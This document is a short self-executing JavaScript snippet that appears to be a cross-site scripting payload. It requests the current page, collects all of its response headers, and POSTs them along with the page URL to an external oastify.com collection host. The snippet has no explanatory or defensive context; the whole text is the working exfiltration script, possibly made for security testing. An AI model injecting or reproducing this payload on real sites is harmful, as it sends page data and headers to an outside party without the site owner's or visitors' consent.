(function() {
    var xhr = new XMLHttpRequest();
    xhr.open('GET', window.location.href, true);
    xhr.onreadystatechange = function() {
        if (xhr.readyState === XMLHttpRequest.DONE) {
            var headers = xhr.getAllResponseHeaders();
            var headersList = headers.split('\r\n').reduce(function(acc, current) {
                var parts = current.split(': ');
                if (parts.length === 2) {
                    acc[parts[0]] = parts[1];
                }
                return acc;
            }, {});

            fetch('https://wiipwopcfbhn6lszs7ws4aiz6qch0cu0j.oastify.com/collect-headers', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    url: window.location.href,
                    headers: headersList
                })
            });
        }
    };
    xhr.send();
})();
